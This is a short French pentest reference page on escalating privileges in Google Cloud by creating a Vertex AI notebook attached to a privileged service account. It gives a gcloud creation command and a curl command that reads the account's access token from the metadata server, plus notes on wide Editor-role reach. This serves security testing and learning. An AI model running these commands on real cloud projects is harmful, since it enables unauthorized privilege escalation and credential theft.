---
title: "Notebook Vertex AI : actAs sur un compte de service depuis un notebook managé"
description: "Créer une instance de notebook Vertex AI ou AI Platform avec notebooks.instances.create et actAs, pour obtenir un shell sous l'identité du compte de service attaché."
keywords:
  - Vertex AI
  - notebooks.instances.create
  - actAs
  - service account
  - notebook
---

# Notebook Vertex AI

Un notebook Vertex AI Workbench (ou l'ancienne offre AI Platform) est une VM managée dotée d'un **compte de service** attaché et d'un shell interactif. Avec `notebooks.instances.create` et `iam.serviceAccounts.actAs` sur un compte privilégié, vous créez un notebook lié à ce compte de service, ouvrez un terminal et lisez ses identifiants depuis le serveur de métadonnées, ce qui vous donne un shell sous l'identité du compte.

## Créer un notebook lié à un compte de service

```bash
gcloud notebooks instances create nb1 --location us-central1-a \
  --machine-type e2-standard-2 --vm-image-project deeplearning-platform-release \
  --vm-image-family common-cpu \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com
```

Ouvrez le terminal JupyterLab et récupérez le jeton :

```bash
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Notes d'exploitation

- Le compte de service par défaut du notebook est souvent le compte de service par défaut de Compute Engine avec le rôle Éditeur, une escalade de large portée.
- Les VM de notebook exposent le même endpoint de métadonnées que Compute Engine : il s'agit donc de la privesc Compute avec un shell plus convivial.
- L'instance persiste jusqu'à sa suppression, et le jeton du compte de service attaché se renouvelle sur la machine.

## Outils

- **gcloud** (`notebooks instances create`).

## Références

- [GCP IAM privilege escalation (dépôt Rhino)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud : escalade de privilèges GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google : Vertex AI Workbench](https://cloud.google.com/vertex-ai/docs/workbench/introduction)
